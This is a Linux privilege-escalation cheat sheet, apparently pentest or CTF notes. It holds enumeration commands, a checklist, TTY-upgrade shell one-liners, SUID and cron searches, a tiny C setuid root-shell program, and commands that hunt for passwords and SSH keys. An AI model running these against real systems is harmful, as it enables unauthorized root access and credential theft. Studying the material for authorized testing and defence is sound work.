  
# Enum  
## Quick Enum
    hostname; ip addr;    
    whoami; id   
    uname -r   
    cat /etc/passwd | grep /bin/bash   
    ls -l /etc/shadow   
    sudo -l  
    ps -aux | grep root 
    
    netstat -antp; arp -a 
    for x in {1 .. 254};do (ping -c 1 l.l.l.$x | grep "bytes from" &); done | cut -d " "
## Scripts
run [lse.sh](https://github.com/diego-treitos/linux-smart-enumeration) with increasing run levels, [linpeas.sh](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS), [linenum](https://github.com/rebootuser/LinEnum) 
## Checklists / What to look for
[gtfobins](https://gtfobins.github.io/) 
- [ ] Fully functional tty? 
- [ ] su root? (no password, root, password) 
- [ ] Sudo binaries? (sudo -l, cat /etc/sudoers)
- [ ] Exploitable cronjobs? 
- [ ] Weird SUID binaries?   
- [ ] Services running as root?, services only available to localhost?
- [ ] Passwords / config files?  
- [ ] Is the kernel vulnerable? (last resort)
[g0tm1lk checklist](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) 
[Linux Priv Esc Checklist](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)  

# Exploits
## Upgrade to a fully functional TTY 
    python -c 'import pty;pty.spawn("/bin/bash")' 
    echo os.system('/bin/bash') 
    /bin/sh -i 
    /bin/bash -p 
## Cronjobs    
look for scripts you can write to or exploit  

    cat /etc/crontab  
    crontab -l    
    ls -al /etc/cron* 
## SUID Binaries
    find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \;  2>/dev/null                                 
### Custom Executable
    int main(){
        setuid(0);
        system("/bin/bash -p");
    }
## Services Running as Root / Services Only Running Locally
    ps -aux | grep root
    mysql running as root exploit 
    ftp, telnet - tcpdump to sniff creds??
## Passwords / config files 
    find . -type f -exec grep -i -I "PASSWORD=" {} /dev/null \; 
    /etc/passwd, /etc/shadow, /etc/group  read or write?? 
    cat ~/.ssh  
## Kernel Exploits 
    uname -a  
    cat /etc/*-release
No compilers on host: use gcc-multilib -m32 (32 bit OS) or -m64 (64 bit OS) then upload 
# File Transfer 
    which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null 
    

# Resources
## Cheat Sheets 
[g0tmi1k Linux Priv Esc Checklist](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)  

## Learn More
